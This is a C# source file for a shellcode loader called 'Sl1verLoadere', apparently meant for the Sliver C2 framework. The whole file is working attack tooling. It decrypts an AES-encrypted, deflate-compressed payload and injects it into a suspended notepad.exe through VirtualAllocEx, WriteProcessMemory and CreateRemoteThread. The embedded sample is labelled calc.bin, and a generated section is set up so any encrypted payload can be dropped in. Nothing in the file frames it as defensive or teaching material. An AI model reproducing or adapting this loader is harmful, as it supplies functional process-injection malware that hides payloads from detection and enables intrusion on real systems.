using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO.Compression;

namespace Sl1verLoadere
{
    public class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        public class SecurityAttributes
        {
            public Int32 Length = 0;
            public IntPtr lpSecurityDescriptor = IntPtr.Zero;
            public bool bInheritHandle = false;

            public SecurityAttributes()
            {
                this.Length = Marshal.SizeOf(this);
            }
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct ProcessInformation
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 dwProcessId;
            public Int32 dwThreadId;
        }
        [Flags]
        public enum CreateProcessFlags : uint
        {
            DEBUG_PROCESS = 0x00000001,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            CREATE_SUSPENDED = 0x00000004,
            DETACHED_PROCESS = 0x00000008,
            CREATE_NEW_CONSOLE = 0x00000010,
            NORMAL_PRIORITY_CLASS = 0x00000020,
            IDLE_PRIORITY_CLASS = 0x00000040,
            HIGH_PRIORITY_CLASS = 0x00000080,
            REALTIME_PRIORITY_CLASS = 0x00000100,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            CREATE_SEPARATE_WOW_VDM = 0x00000800,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            CREATE_FORCEDOS = 0x00002000,
            BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
            ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
            INHERIT_PARENT_AFFINITY = 0x00010000,
            INHERIT_CALLER_PRIORITY = 0x00020000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
            PROCESS_MODE_BACKGROUND_END = 0x00200000,
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NO_WINDOW = 0x08000000,
            PROFILE_USER = 0x10000000,
            PROFILE_KERNEL = 0x20000000,
            PROFILE_SERVER = 0x40000000,
            CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,
        }


        [StructLayout(LayoutKind.Sequential)]
        public class StartupInfo
        {
            public Int32 cb = 0;
            public IntPtr lpReserved = IntPtr.Zero;
            public IntPtr lpDesktop = IntPtr.Zero;
            public IntPtr lpTitle = IntPtr.Zero;
            public Int32 dwX = 0;
            public Int32 dwY = 0;
            public Int32 dwXSize = 0;
            public Int32 dwYSize = 0;
            public Int32 dwXCountChars = 0;
            public Int32 dwYCountChars = 0;
            public Int32 dwFillAttribute = 0;
            public Int32 dwFlags = 0;
            public Int16 wShowWindow = 0;
            public Int16 cbReserved2 = 0;
            public IntPtr lpReserved2 = IntPtr.Zero;
            public IntPtr hStdInput = IntPtr.Zero;
            public IntPtr hStdOutput = IntPtr.Zero;
            public IntPtr hStdError = IntPtr.Zero;
            public StartupInfo()
            {
                this.cb = Marshal.SizeOf(this);
            }
        }
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateProcessA(String lpApplicationName, String lpCommandLine, SecurityAttributes lpProcessAttributes, SecurityAttributes lpThreadAttributes, Boolean bInheritHandles, CreateProcessFlags dwCreationFlags, IntPtr lpEnvironment, String lpCurrentDirectory, [In] StartupInfo lpStartupInfo, out ProcessInformation lpProcessInformation);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, IntPtr dwSize, out int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);


        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        private static UInt32 MEM_COMMIT = 0x1000;

        public static void Main()
        {
            // Hardcoded payload, no network stage. The first 16 bytes of
            // EncryptedShellcode are the AES IV (matches payload.bin).
            if (Payload.EncryptedShellcode.Length < 17 || Payload.AESKey.Length != 32)
                return;

            byte[] iv = Payload.EncryptedShellcode.Take(16).ToArray();
            byte[] ciphertext = Payload.EncryptedShellcode.Skip(16).ToArray();

            byte[] compressed = Decrypt(ciphertext, Payload.AESKey, iv);
            byte[] sc = Decompress(compressed, Payload.CompressionAlgorithm);

            Inject(sc, Payload.TargetBinary);
        }

        public static void Inject(byte[] sc, string TargetBinary)
        {
            Int32 size = sc.Length;
            StartupInfo sInfo = new StartupInfo();
            sInfo.dwFlags = 0;
            ProcessInformation pInfo;
            string binaryPath = "C:\\Windows\\System32\\" + TargetBinary;
            IntPtr funcAddr = CreateProcessA(binaryPath, null, null, null, true, CreateProcessFlags.CREATE_SUSPENDED, IntPtr.Zero, null, sInfo, out pInfo);
            IntPtr hProcess = pInfo.hProcess;
            IntPtr spaceAddr = VirtualAllocEx(hProcess, new IntPtr(0), size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            IntPtr size2 = new IntPtr(sc.Length);
            bool bWrite = WriteProcessMemory(hProcess, spaceAddr, sc, size2, out int bytesWritten);
            CreateRemoteThread(hProcess, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));
            return;
        }

        public static byte[] Decompress(byte[] data, string CompressionAlgorithm)
        {
            byte[] decompressedArray = null;
            if (CompressionAlgorithm == "deflate9")
            {
                using (MemoryStream decompressedStream = new MemoryStream())
                {
                    using (MemoryStream compressStream = new MemoryStream(data))
                    {
                        using (DeflateStream deflateStream = new DeflateStream(compressStream, CompressionMode.Decompress))
                        {
                            deflateStream.CopyTo(decompressedStream);
                        }
                    }
                    decompressedArray = decompressedStream.ToArray();
                }
                return decompressedArray;
            }
            else if (CompressionAlgorithm == "gzip")
            {
                using (MemoryStream decompressedStream = new MemoryStream())
                {
                    using (MemoryStream compressStream = new MemoryStream(data))
                    {
                        using (GZipStream gzipStream = new GZipStream(compressStream, CompressionMode.Decompress))
                        {
                            gzipStream.CopyTo(decompressedStream);
                        }
                    }
                    decompressedArray = decompressedStream.ToArray();
                }
                return decompressedArray;
            }
            else
            {
                // "none": AES-CBC always pads to a 16-byte boundary (PKCS7), strip it
                int padLen = data[data.Length - 1];
                if (padLen > 0 && padLen <= 16 && data.Length >= padLen
                    && data.Skip(data.Length - padLen).All(b => b == padLen))
                    return data.Take(data.Length - padLen).ToArray();
                return data;
            }
        }

        // AES-256-CBC, PKCS7 padding (matches encryptor.py)
        public static byte[] Decrypt(byte[] ciphertext, byte[] AESKey, byte[] AESIV)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = AESKey;
                aesAlg.IV = AESIV;
                aesAlg.Mode = CipherMode.CBC;
                aesAlg.Padding = PaddingMode.PKCS7;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(ciphertext, 0, ciphertext.Length);
                    }
                    return memoryStream.ToArray();
                }
            }
        }
    }


    // =====================================================================
    // GENERATED SECTION
    // Replace the four members below with the contents of payload.cs
    // produced by encryptor.py (or delete this class and add payload.cs
    // to the project as its own file).
    // shellcode: calc.bin (276 bytes) | compression: deflate9 | target: notepad.exe
    // =====================================================================
    public static class Payload
    {
        // First 16 bytes of EncryptedShellcode are the AES IV (matches payload.bin exactly).
        public static byte[] EncryptedShellcode = new byte[]
        {
            0x70, 0x1a, 0xbc, 0xd3, 0x39, 0x46, 0x00, 0x8a, 0xb2, 0x30, 0x83, 0x9d, 0x9f, 0x98, 0x17, 0x7b,
            0xbe, 0x0e, 0x0d, 0xad, 0x99, 0x64, 0xeb, 0x17, 0x06, 0x1b, 0x46, 0x36, 0xa3, 0x3c, 0xc9, 0xc7,
            0x70, 0x18, 0xbd, 0xdb, 0x02, 0x0a, 0x5d, 0x9b, 0x6d, 0x27, 0x25, 0x5c, 0x46, 0xb7, 0xcb, 0x18,
            0x41, 0x6d, 0x18, 0x45, 0xd7, 0x99, 0xc6, 0x71, 0x33, 0xdd, 0x18, 0xb8, 0x7b, 0x11, 0x4f, 0x6e,
            0xa0, 0x30, 0x87, 0x1f, 0x44, 0x78, 0x8f, 0x0e, 0x72, 0x18, 0x64, 0xde, 0x30, 0x4e, 0x89, 0x1b,
            0x29, 0xad, 0xb9, 0xff, 0x4e, 0x4c, 0x9d, 0x7e, 0xc0, 0x06, 0xec, 0xf7, 0x6f, 0xfc, 0xe1, 0x80,
            0xc7, 0x83, 0x0c, 0xf7, 0xab, 0x59, 0xa6, 0x80, 0xc5, 0x32, 0x78, 0x44, 0x7f, 0xa0, 0xbc, 0xc0,
            0x97, 0x18, 0x26, 0xde, 0xa4, 0x5a, 0x61, 0x26, 0xe5, 0x17, 0x0e, 0x64, 0xdf, 0x62, 0x0f, 0x30,
            0x4e, 0x78, 0xe8, 0x2c, 0x95, 0x9b, 0x72, 0xda, 0x12, 0x41, 0xaa, 0x6a, 0x56, 0x58, 0x6d, 0xf9,
            0x8b, 0x27, 0x79, 0xb0, 0x05, 0x0a, 0x28, 0x8b, 0x42, 0xde, 0x9d, 0x1c, 0xd0, 0x99, 0x96, 0x6c,
            0x4b, 0xfe, 0x47, 0x59, 0x0e, 0x5a, 0xb0, 0x64, 0x89, 0x02, 0x0e, 0x8d, 0x48, 0xac, 0xec, 0xc3,
            0x32, 0x42, 0x70, 0xf9, 0x09, 0x0f, 0x34, 0x37, 0x85, 0x12, 0x18, 0x37, 0x89, 0x2f, 0x41, 0x65,
            0xd5, 0x88, 0x50, 0xdb, 0x9a, 0x85, 0x16, 0xe7, 0x68, 0x02, 0xd8, 0xe6, 0x08, 0x51, 0x15, 0x49,
            0xcb, 0x3f, 0x8c, 0x31, 0xed, 0xf6, 0x40, 0x7a, 0x2e, 0x02, 0x03, 0xd0, 0x05, 0x04, 0x7a, 0x45,
            0xa9, 0xac, 0x15, 0x58, 0x49, 0xd8, 0x59, 0x2d, 0xd2, 0x4f, 0x4d, 0xe2, 0xea, 0x9b, 0x85, 0xfa,
            0xc9, 0x88, 0xaf, 0x22, 0xf8, 0x44, 0x1f, 0xd1, 0x84, 0x4b, 0x81, 0x34, 0xaa, 0xf0, 0xdd, 0x99,
            0x55, 0xa9, 0x4f, 0xf4, 0xff, 0x3f, 0xd1, 0xa1, 0x15, 0x89, 0xa7, 0xb5, 0x45, 0x45, 0xbb, 0x00
        };

        public static byte[] AESKey = new byte[]
        {
            0x37, 0x9e, 0x1f, 0xb5, 0x19, 0xb9, 0x85, 0xe0, 0x82, 0x8d, 0x6b, 0x92, 0x8c, 0x98, 0x87, 0x64,
            0x18, 0x35, 0x0a, 0xa3, 0xbd, 0x5f, 0xad, 0xb1, 0x0f, 0x65, 0x6c, 0xbe, 0x4d, 0x03, 0x83, 0xbb
        };

        public static string CompressionAlgorithm = "deflate9";
        public static string TargetBinary = "notepad.exe";
    }
}